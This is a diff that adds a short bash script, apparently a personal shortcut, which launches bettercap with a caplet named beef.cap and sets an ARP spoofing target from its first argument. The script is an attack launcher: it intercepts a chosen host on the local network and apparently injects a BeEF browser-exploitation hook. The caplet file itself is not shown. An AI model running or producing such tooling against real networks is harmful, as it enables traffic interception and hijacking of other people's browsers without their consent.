@@ -1,0 +1,11 @@
+#!/bin/bash
+
+CAPLETDIR=~/bin/scripts/security/caplets/mine
+
+if [ -z "$1" ]
+then
+    echo "missing terget ip; usage: bjs 192.168.1.50"
+else 
+    sudo bettercap -caplet $CAPLETDIR/beef.cap -eval "set arp.spoof.targets $1"
+fi
+
